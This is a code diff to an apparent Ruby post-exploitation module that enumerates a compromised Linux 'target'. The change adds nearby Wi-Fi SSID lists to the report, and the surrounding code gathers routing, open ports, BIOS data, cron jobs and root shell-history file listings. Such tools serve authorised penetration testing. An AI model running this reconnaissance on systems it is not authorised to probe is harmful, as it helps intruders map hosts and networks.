@@ -214,6 +214,7 @@ def run
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
       hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
+      target_ssid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -1")
       mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
@@ -250,6 +251,7 @@ def run
         data_dump << "Ruby version        : #{ruby_version}\n"
         data_dump << "Firefox version     : #{firefox_version}\n"
         data_dump << "Target interface    : #{interface}\n"
+        data_dump << "target_SSID         : #{target_ssid}"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
         data_dump << "Target localhost    : #{localhost_ip}\n"
@@ -280,6 +282,7 @@ def run
           net_stat = cmd_exec("netstat -tulpn")
           demi_bios = cmd_exec("dmidecode -t bios")
           cron_tasks = cmd_exec("ls -la /etc/cron*")
+          show_essids = cmd_exec("nmcli dev wifi list")
           distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
@@ -332,6 +335,10 @@ def run
             data_dump << "ESTABLISHED CONNECTIONS :\n"
             data_dump << "-------------------------\n"
             data_dump << net_established
+            data_dump << "\n\n"
+            data_dump << "LIST OF ESSIDS AVAILABLE :\n"
+            data_dump << "--------------------------\n"
+            data_dump << show_essids
             data_dump << "\n\n"
             data_dump << "CRONTAB TASKS :\n"
             data_dump << "---------------\n"
